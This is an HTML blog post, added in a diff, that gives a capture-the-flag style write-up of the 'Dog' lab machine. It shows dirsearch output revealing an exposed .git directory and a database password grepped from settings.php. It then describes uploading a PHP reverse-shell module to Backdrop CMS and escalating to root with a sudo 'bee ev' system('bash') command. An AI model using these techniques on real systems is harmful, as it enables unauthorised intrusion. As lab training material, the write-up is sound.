@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Easy - Dog - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Easy - Dog</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1741641285879"
+                  >2025-03-10 22:14</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1742156190931"
+                  >2025-03-16 21:16</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p>Only 22 and 80 are open.<br />
+Subdomain search is impossible, returns always 200 and different sizes.<br />
+Main site is powered by backdrop cms.</p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$dirsearch</span> --url <span class="hljs-number">10.129</span>.<span class="hljs-number">45.144</span>
+
+  _|. _ _  _  _  _ _|_    v0.<span class="hljs-number">4.3</span>
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="hljs-number">25</span>
+Wordlist size: <span class="hljs-number">11460</span>
+
+Output File: <span class="hljs-regexp">/home/u</span>ser<span class="hljs-regexp">/reports/</span>_10.<span class="hljs-number">129.45</span>.<span class="hljs-number">144</span>/_25-<span class="hljs-number">03</span>-<span class="hljs-number">10</span>_21-<span class="hljs-number">16</span>-<span class="hljs-number">23</span>.txt
+
+Target: http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">45.144</span>/
+
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">24</span>] Starting: 
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">26</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">313</span>B  - <span class="hljs-regexp">/.git  -&gt;  http:/</span><span class="hljs-regexp">/10.129.45.144/</span>.git/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">23</span>B  - <span class="hljs-regexp">/.git/</span>HEAD
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">412</span>B  - <span class="hljs-regexp">/.git/</span>branches/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">95</span>B  - <span class="hljs-regexp">/.git/</span>COMMIT_EDITMSG
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">92</span>B  - <span class="hljs-regexp">/.git/</span>config
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">607</span>B  - <span class="hljs-regexp">/.git/</span>
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">73</span>B  - <span class="hljs-regexp">/.git/</span>description
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">653</span>B  - <span class="hljs-regexp">/.git/</span>hooks/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">240</span>B  - <span class="hljs-regexp">/.git/i</span>nfo/exclude
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">458</span>B  - <span class="hljs-regexp">/.git/i</span>nfo/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">329</span>B  - <span class="hljs-regexp">/.git/</span>logs<span class="hljs-regexp">/refs/</span>heads  -&gt;  http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">45.144</span><span class="hljs-regexp">/.git/</span>logs<span class="hljs-regexp">/refs/</span>heads/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">230</span>B  - <span class="hljs-regexp">/.git/</span>logs/HEAD
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">479</span>B  - <span class="hljs-regexp">/.git/</span>logs/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">323</span>B  - <span class="hljs-regexp">/.git/</span>logs<span class="hljs-regexp">/refs  -&gt;  http:/</span><span class="hljs-regexp">/10.129.45.144/</span>.git<span class="hljs-regexp">/logs/</span>refs/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">230</span>B  - <span class="hljs-regexp">/.git/</span>logs<span class="hljs-regexp">/refs/</span>heads/master
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">324</span>B  - <span class="hljs-regexp">/.git/</span>refs<span class="hljs-regexp">/heads  -&gt;  http:/</span><span class="hljs-regexp">/10.129.45.144/</span>.git<span class="hljs-regexp">/refs/</span>heads/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">41</span>B  - <span class="hljs-regexp">/.git/</span>refs<span class="hljs-regexp">/heads/m</span>aster
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">323</span>B  - <span class="hljs-regexp">/.git/</span>refs<span class="hljs-regexp">/tags  -&gt;  http:/</span><span class="hljs-regexp">/10.129.45.144/</span>.git<span class="hljs-regexp">/refs/</span>tags/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">463</span>B  - <span class="hljs-regexp">/.git/</span>refs/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">27</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">337</span>KB - <span class="hljs-regexp">/.git/i</span>ndex
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">28</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/.git/</span>objects/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">38</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">313</span>B  - <span class="hljs-regexp">/core  -&gt;  http:/</span><span class="hljs-regexp">/10.129.45.144/</span>core/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">40</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">314</span>B  - <span class="hljs-regexp">/files  -&gt;  http:/</span><span class="hljs-regexp">/10.129.45.144/</span>files/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">40</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">588</span>B  - <span class="hljs-regexp">/files/</span>
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">42</span>] <span class="hljs-number">404</span> -    <span class="hljs-number">2</span>KB - <span class="hljs-regexp">/index.php/</span>login/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">42</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">458</span>B  - <span class="hljs-regexp">/layouts/</span>
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">43</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">7</span>KB - /LICENSE.txt
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">316</span>B  - <span class="hljs-regexp">/modules  -&gt;  http:/</span><span class="hljs-regexp">/10.129.45.144/m</span>odules/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">44</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">406</span>B  - <span class="hljs-regexp">/modules/</span>
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">48</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">5</span>KB - /README.md
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">51</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">528</span>B  - /robots.txt
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">51</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">278</span>B  - /server-status
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">51</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">278</span>B  - <span class="hljs-regexp">/server-status/</span>
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">52</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /settings.php
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">52</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">314</span>B  - <span class="hljs-regexp">/sites  -&gt;  http:/</span><span class="hljs-regexp">/10.129.45.144/</span>sites/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">54</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">315</span>B  - <span class="hljs-regexp">/themes  -&gt;  http:/</span><span class="hljs-regexp">/10.129.45.144/</span>themes/
+[<span class="hljs-number">21</span>:<span class="hljs-number">16</span>:<span class="hljs-number">54</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">457</span>B  - <span class="hljs-regexp">/themes/</span></code></pre></div>
+<p>We can downloead all of the files using gitdumper.<br />
+<code>git log</code> shows that there is only one commit, so nothing interesting there.<br />
+Looking for passwords is tedious, because of the amount but find and grep are handy.</p>
+<p><code>grep -ri "\$database" .</code> finds us <code>./settings.php:$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';</code></p>
+<p>mysql is not accessible and these are not proper creds for the admin panel of backdrop CMS.</p>
+<p>Looking further, with <code>grep -ri "@dog.htb" .</code> we can find <code>./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"</code>.</p>
+<p>We are in.</p>
+<p><img src="/_resources/bc49154411494c1e93b2c4843f5f55c9.png" /></p>
+<h1 id="abusing-admin-panel">Abusing admin panel</h1>
+<p>We are abusing standard CMS trick, by uploading new theme to the CMS which will return us revshell when someone enters the website.</p>
+<p>We have to create a new dir, add and modify modify <a title="http://pentestmonkey.net/tools/php-reverse-shell" href="http://pentestmonkey.net/tools/php-reverse-shell">http://pentestmonkey.net/tools/php-reverse-shell</a> with our ip to it, add shell.info file (copied from other extension) and then tar it. We can upload it using “Manual instalation”. Then just try to access /modules/shell/shell.php to get rev shell.</p>
+<p><img src="/_resources/ef5f088cb5604244afc0a5819c9a9419.png" /></p>
+<p><img src="/_resources/e9ed52556787470681b64b38df4a8687.png" /></p>
+<p><img src="/_resources/95f21339d14d45fca8046e00ac398697.png" /></p>
+<p>There are two users on the server, jobert and johncusack and john is our first target as he has user.txt flag.</p>
+<p><img src="/_resources/846b406c2fce4cceacffd8a95336b6f5.png" /></p>
+<p><img src="/_resources/bf89dc31b2c24e468dc981e13176b1d7.png" /></p>
+<p>I tried reusing password for tiffany, <code>BackDropJ2024DS2024</code> and got in.</p>
+<p><img src="/_resources/43ae7e02fe894a3ba78d09fd6686569b.png" /></p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>We have our first and prob. last target on entrance.</p>
+<p><img src="/_resources/c2a0827495734b96be5d063cf58423b2.png" /></p>
+<p><code>bee</code> is prob a tool to install backdrop.</p>
+<p><img src="/_resources/8ae87c00a97e4a75ab9b5eba3b25aae5.png" /></p>
+<p>Reading further, we can find nice advanced option.</p>
+<p><img src="/_resources/567f23dcc11c43e5966b33eb39bc35e4.png" /></p>
+<p>Running arbitrary php with root privs makes us basicly a root, so we can just get shell with <code>sudo /usr/local/bin/bee --root='/var/www/html/' ev 'system('bash')'</code></p>
+<p><img src="/_resources/fd4295f90eae4f99809997c1c7e77f23.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
